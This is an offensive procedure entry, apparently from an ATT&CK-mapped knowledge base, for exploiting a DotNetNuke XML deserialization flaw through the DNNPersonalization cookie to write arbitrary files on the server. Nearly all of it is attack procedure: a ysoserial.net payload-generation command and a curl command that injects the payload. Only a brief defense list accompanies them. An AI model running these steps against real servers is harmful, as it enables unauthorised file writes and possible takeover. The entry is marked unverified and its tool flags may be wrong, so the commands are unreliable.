---
id: uuid-placeholder-3
tags:
  - deserialization
  - file-write
  - payload-craft
type: procedure
tools:
  - '[[tools/ysoserial.net]]'
  - '[[tools/Exploit-DB-Exploit-48336]]'
  - '[[tools/DNndocs-API-Documentation]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-payload]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation of Remote Services]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:54.237Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation of Remote Services]]'
  - '[[Windows Command Shell]]'
---
# Inject Crafted Deserialization Payload for File Write

## Summary

This procedure crafts and injects an XML deserialization payload into the DNNPersonalization cookie to invoke FileSystemUtils.WriteFile, enabling arbitrary file writes on the server.

## Description

Using ysoserial.net or Exploit-DB, generate payloads targeting DNN classes like DotNetNuke.Common.Utilities.FileSystemUtils. The payload uses ObjectDataProvider to call methods without validation. Targets DNN on .NET; outcomes include file creation in specified paths.

## Requirements

1. ysoserial.net installed
2. Access to DNndocs for class references
3. HTTP tool for injection

## Defense

Defensive measures and detection strategies:

- Patch DNN to latest version
- Disable unsafe deserializers
- Monitor file system changes

## Objectives

1. Generate valid XML payload
2. Inject via cookie
3. Confirm file write success

## Instructions

### Step 1: Generate Payload with ysoserial.net

**Context**: Create XML for WriteFile method.

**Command** ([[commands/ysoserial-generate]]):
```bash
ysoserial.exe -p DNNPersonalization -f WriteFile -c "DotNetNuke.Common.Utilities.FileSystemUtils" --path="test.txt" --content="test data"
```

> Outputs base64 or XML payload; use DNndocs for method signatures.

### Step 2: Inject Payload

**Context**: Send to 404 page.

**Command** ([[commands/curl-inject-payload]]):
```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<generated-xml-payload>"
```

> Replace <generated-xml-payload> with output from Step 1.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation of Remote Services]]
- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/ysoserial-generate]]
- [[commands/curl-inject-payload]]

## Tools Used

- [[tools/ysoserial.net]]
- [[tools/DNndocs-API-Documentation]]

## Tags

- deserialization
- file-write
